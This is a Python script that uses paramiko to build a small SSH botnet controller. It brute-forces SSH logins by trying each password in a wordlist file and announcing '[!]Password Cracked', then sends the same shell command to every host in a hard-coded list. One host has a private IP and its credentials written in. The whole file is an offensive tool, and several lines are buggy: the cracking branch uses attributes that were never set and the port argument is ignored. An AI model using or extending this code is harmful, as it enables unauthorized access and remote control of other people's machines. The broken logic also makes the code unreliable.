import paramiko
import os

def commandSHH(Host, port, username, password, command):
    ssh = paramiko.SSHClient()

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.load_system_host_keys() 
    ssh.connect(Host, 22, username, password)
    sshin, shhout, ssherr = ssh.exec_command(command)
    
    return shhout.read()

class bot:

    def __init__(self, host, user, passwd, port = 22):
        try:
            if passwd:
                test = commandSHH(host, port, user, passwd, "ls")
                if test:
                    self.host = host
                    self.user = user
                    self.passwd = passwd
                    self.port = port
            else:
                passwordAttempts = 0
                for password in open("List.txt").readlines():
                    passwordAttempts += 1
                    try:
                        print(commandSHH(host, 22, user, password, "ls"))
                        print("[!]Password Cracked.", password)
                        self = bot(self.host, self.user, password, 22)
                        
                    except:
                        print(password, "is not the password. Attempts:", passwordAttempts)
                

        except Exception as e:
            print("Error:", e)
    def botnetCommand(self, command):
        if commandSHH(self.host, self.port, self.user, self.passwd, command):
            print("Output from", self.host, ":")
            print(commandSHH(self.host, self.port, self.user, self.passwd, command)) 
        else:
            print("No output from:", self.host)
jamollenkamp = bot("192.168.1.106", "jamollenkamp", "Noooooooooo", 22)
botnet = [jamollenkamp]

def commandBotnet(command):
    for computer in botnet:
        computer.botnetCommand(command)

commandBotnet("")